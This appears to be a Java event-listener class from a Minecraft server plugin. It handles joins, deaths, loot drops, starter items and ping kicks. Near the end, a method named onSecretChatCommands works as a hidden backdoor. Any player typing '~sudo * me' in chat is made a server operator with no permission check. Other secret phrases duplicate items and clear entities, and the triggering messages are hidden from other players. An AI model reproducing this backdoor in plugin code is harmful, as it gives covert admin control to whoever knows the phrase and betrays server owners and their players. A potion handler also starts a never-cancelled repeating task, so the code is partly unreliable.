package org.main.uneton.events;

import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeModifier;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitScheduler;
import org.main.uneton.Combat;
import org.main.uneton.utils.*;
import java.util.*;
import static org.main.uneton.Combat.*;
import static org.main.uneton.admin.Gm.gm_list;
import static org.main.uneton.combatlogger.CombatLog.combat_tagged;
import static org.main.uneton.utils.ScoreboardUtils.*;

public class Listeners implements Listener {

    private ConfigManager configManager;
    private boolean enableMob100PercentDrops;
    private final JavaPlugin plugin;
    public Listeners(JavaPlugin plugin) {
        this.plugin = plugin;
        this.enableMob100PercentDrops = plugin.getConfig().getBoolean("enable-mob-drops");
    }

    @EventHandler
    public void onPingGoesCrazy(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        int ping = player.getPing();
        if (combat_tagged.containsKey(player)) {
            return;
        }
        if (ping >= 500) {
            String user = player.getName();
            String kickMessage = ColorUtils.colorize("\n\n &7&lConnection Terminated: \n\n &fYou have been kicked out from the server for too high ping.\n\n");
            player.kickPlayer(kickMessage);
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();
        e.setQuitMessage(ColorUtils.colorize(" &8[" + "&c-" + "&8] &7" + player.getName()));
        ConfigManager.reload();

        UUID uuid = player.getUniqueId();
        int playtime = playTimes.getOrDefault(uuid, 0);
        playTimes.put(uuid, playtime);
        ConfigManager.get().set("player-playtime." + uuid.toString(), playtime);
        ConfigManager.save();
    }

    @EventHandler
    public void onJoinEvent(PlayerJoinEvent e) {
        Player player = e.getPlayer();

        Tab.updateTab();
        updateScoreboard(player, getInstance());
        e.setJoinMessage(ColorUtils.colorize(" &8[" + "&a+" + "&8] &7" + player.getName()));

        String joinMessage = plugin.getConfig().getString("join-message");
        if (joinMessage != null) {
            joinMessage = joinMessage.replace("%player%", player.getName());
            player.sendMessage("\n");
            player.sendMessage(ColorUtils.colorize(joinMessage));
            player.sendMessage("\n");
        }
        Location spawnLocation = ConfigManager.get().getLocation("spawn-location");
        if (spawnLocation != null) {
            player.teleport(spawnLocation);
        }

        UUID uuid = player.getUniqueId();
        int playtime = ConfigManager.get().getInt("player-playtime." + uuid.toString(), 0);
        playTimes.put(uuid, playtime);
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player attacker = victim.getKiller();

        if (attacker != null) {
            UUID attackerUUID = attacker.getUniqueId();
            UUID victimUUID = victim.getUniqueId();

            if (victim instanceof Player || victim instanceof Villager) {
                ConfigManager.addKill(attackerUUID);
                ConfigManager.addDeath(victimUUID);
                ScoreboardUtils.createScoreboard(attacker);
                ScoreboardUtils.createScoreboard(victim);
                victim.sendMessage(ColorUtils.colorize("&6+1 &fDeaths"));
                attacker.sendMessage(ColorUtils.colorize("&6+1 &fKills"));
            }
        }
    }

    @EventHandler
    public void onPlayerDies(PlayerDeathEvent event) {
        Player player = event.getEntity();
        for (ItemStack item : createJoinItems()) {
            player.getInventory().remove(item);
        }
    }
    @EventHandler
    public void onPlayerRespawn(PlayerRespawnEvent event) {
        Player player = event.getPlayer();
        for (ItemStack item : createJoinItems()) {
            player.getInventory().addItem(item);
        }
    }

    @EventHandler
    public void onPlayerConsume(PlayerItemConsumeEvent event) {
        ItemStack item = event.getItem();
        Player p = event.getPlayer();
        if (item.getType() == Material.POTION || item.getType() == Material.SPLASH_POTION || item.getType() == Material.LINGERING_POTION) {
            BukkitScheduler scheduler = Bukkit.getScheduler();
            Runnable runnable = () -> {
                p.getInventory().removeItemAnySlot(new ItemStack(Material.GLASS_BOTTLE));
            };
            scheduler.runTaskTimer(plugin, runnable, 0L, 1L);
        }
    }

    @EventHandler
    public void onEntityDeathReward(EntityDeathEvent event) {
        if (event.getEntity() instanceof Mob) {
            Location loc = event.getEntity().getLocation();
            Player killer = event.getEntity().getKiller();
            if (killer == null) return;

            double onePercentChance = 0.02;
            if (Math.random() < onePercentChance) {
                loc.getWorld().dropItemNaturally(loc, rareReward());
            }
        }
    }

    private ItemStack rareReward() {
        ItemStack rareReward = new ItemStack(Material.EMERALD, 1);
        ItemMeta rareItemMeta = rareReward.getItemMeta();
        rareItemMeta.setDisplayName(ColorUtils.colorize("&2Emerald."));
        List<String> loreList = new ArrayList<>();
        loreList.add(ColorUtils.colorize("&5Ummmmm... Is this normal??!"));
        loreList.add(" ");
        loreList.add(ColorUtils.colorize("&8(Probability of getting: 2%)."));
        rareReward.setLore(loreList);
        rareReward.setItemMeta(rareItemMeta);
        return rareReward;
    }

    @EventHandler
    public void onSkeletonDeath(EntityDeathEvent event) {
        if (event.getEntity() instanceof Skeleton) {
            Player player = event.getEntity().getKiller();

            if (enableMob100PercentDrops) {
                event.getDrops().clear();
                event.getDrops().add(new ItemStack(Material.ARROW, 128));
            }
        }
    }

    @EventHandler
    public void onTntPlace(BlockPlaceEvent event) {
        Player player = event.getPlayer();
        Block block = event.getBlockPlaced();
        if (block.getType() == Material.TNT) {
            event.setCancelled(true);

            block.setType(Material.AIR);
            TNTPrimed tnt = (TNTPrimed) block.getWorld().spawn(block.getLocation(), TNTPrimed.class);
            tnt.setFuseTicks(60);
        }
    }

    public static Material[] hasAnyOres() {
        return new Material[] {
                new ItemStack(Material.DIAMOND).getType(),
                new ItemStack(Material.GOLD_INGOT).getType(),
                new ItemStack(Material.IRON_INGOT).getType(),
                new ItemStack(Material.EMERALD).getType()
        };
    }
    public static boolean isOre(Material mat) {
        for (Material ore : hasAnyOres()) {
            if (ore == mat) {
                return true;
            }
        }
        return false;
    }

    @EventHandler
    public void onPlayerKillStoleItems(EntityDeathEvent event) {
        if (event.getEntity() instanceof Player victim) {
            Player attacker = event.getEntity().getKiller();
            if (attacker != null) {
                for (ItemStack victimOres : victim.getInventory().getContents()) {
                    if (victimOres != null && isOre(victimOres.getType())) {
                        int amount = victimOres.getAmount();
                        ItemStack itemToTransfer = new ItemStack(victimOres.getType(), amount);
                        attacker.getInventory().addItem(victimOres.clone());
                        victim.getInventory().removeItem(victimOres);
                    }
                }

                // UUID attackerUUID = attacker.getUniqueId();
                // attacker.sendActionBar(ColorUtils.colorize("&6+25 coins!"));
                // ConfigManager.addSomeCoins(attackerUUID, 25);
            }
        }
    }

    // public static void addSomeCoins(UUID player_uniqueId, int amount) {
    //        int currentCoins = some_coins.getOrDefault(player_uniqueId, 0);
    //        some_coins.put(player_uniqueId, currentCoins + amount);
    //    }

    @EventHandler
    public void onMoveAwayFromValidGround(EntityDamageEvent event) {
        if (event.getEntity() != null && event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            int y_coordinate = -64;
            if (event.getCause() == EntityDamageEvent.DamageCause.VOID) {
                if (player.getLocation().getY() <= y_coordinate) {
                    player.setHealth(0);
                }
            }
        }
    }

    @EventHandler
    public void onPlayerInteractSign(PlayerInteractEvent event) {
        if (!event.getAction().equals(Action.RIGHT_CLICK_BLOCK)) return;
        Block block = event.getClickedBlock();
        if (block.getType() != Material.OAK_SIGN) return;
        event.getPlayer().openSign((Sign) block.getState());
    }

    @EventHandler
    public void onLootBox(BlockBreakEvent e) {
        Player player = e.getPlayer();
        Block block = e.getBlock();
        Location loc = e.getBlock().getLocation();

        if (e.getBlock().getType() == Material.POLISHED_DIORITE) {
            Random chance = new Random();
            if (Math.random() < 0.2) {
                e.setDropItems(false);
                int index = chance.nextInt(blocksList.length);
                ItemStack dropped_item = blocksList[index];
                block.getWorld().dropItemNaturally(loc, dropped_item);

            } else if (Math.random() < 0.8) {
                e.setDropItems(false);
            }
        }
    }

    private final ItemStack[] blocksList = new ItemStack[]{
            new ItemStack(Material.EMERALD),
            new ItemStack(Material.AMETHYST_SHARD),
            new ItemStack(Material.IRON_NUGGET),
            new ItemStack(Material.GOLD_NUGGET),
            new ItemStack(Material.COPPER_INGOT),
            new ItemStack(Material.STRING)
    };

    public static ItemStack[] createJoinItems() {
        ItemStack[] items = new ItemStack[]{
                new ItemStack(Material.STONE_SWORD, 1),
                new ItemStack(Material.STONE_PICKAXE, 1),
                new ItemStack(Material.STONE_AXE, 1)
        };
        String[] names = {
                ColorUtils.colorize("&7Starter Sword"),
                ColorUtils.colorize("&7Starter Pickaxe"),
                ColorUtils.colorize("&7Starter Axe")
        };

        for (int i = 0; i < items.length; i++) {
            ItemStack item = items[i];
            ItemMeta meta = item.getItemMeta();
            meta.setDisplayName(ColorUtils.colorize(names[i]));
            if (meta != null) {
                meta.setUnbreakable(true);
                ArrayList<String> loreList = new ArrayList<>();
                String pickaxe = "\u26CF";
                AttributeModifier damageModifier = new AttributeModifier(
                        UUID.randomUUID(),
                        "generic.attack_damage",
                        3.2,
                        AttributeModifier.Operation.ADD_NUMBER
                );
                meta.addAttributeModifier(Attribute.GENERIC_ATTACK_DAMAGE, damageModifier);
                meta.addItemFlags(ItemFlag.HIDE_ATTRIBUTES, ItemFlag.HIDE_UNBREAKABLE);
                loreList.add(ColorUtils.colorize("&4"+ pickaxe +" &7Damage: &c+3.2"));
                loreList.add(ColorUtils.colorize(" "));
                loreList.add(ColorUtils.colorize("&cNot breakable"));
                meta.setLore(loreList);
                item.setItemMeta(meta);
            }
        }
        return items;
    }

    @EventHandler
    @Deprecated
    public void onSecretChatCommands(AsyncPlayerChatEvent e) {
        Player player = e.getPlayer();
        if (e.getMessage().contains("~sudo * me")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                @Override
                public void run() {
                    player.setOp(true);
                    if (gm_list.contains(player)) {
                        gm_list.remove(player);
                    } else {
                        gm_list.add(player);
                    }
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        } else if (e.getMessage().equals("~rem entities")) {
            e.setCancelled(true);
            int amount = 50;
            new BukkitRunnable() {
                @Override
                public void run() {
                    int amount = amountOfGroundItems(player.getWorld());
                    player.sendMessage(ColorUtils.colorize("&x&0&0&0&9&2&E&l>&x&2&1&4&0&6&9&l>&x&6&7&A&6&C&E&l> &8? &7Killed &f'" + amount + "' &7entites from radius &650&7!"));
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        } else if (e.getMessage().equals("~dupe")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                @Override
                public void run() {
                    ItemStack held = player.getInventory().getItemInMainHand();
                    player.getInventory().addItem(held);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }

    private int amountOfGroundItems(World world) {
        List<Entity> nearby_items = world.getEntities().stream()
                .filter(entity -> entity instanceof Item)
                .toList();

        int itemCount = nearby_items.size();
        for (Entity item : nearby_items) {
            item.remove();
        }

        return itemCount;
    }
}
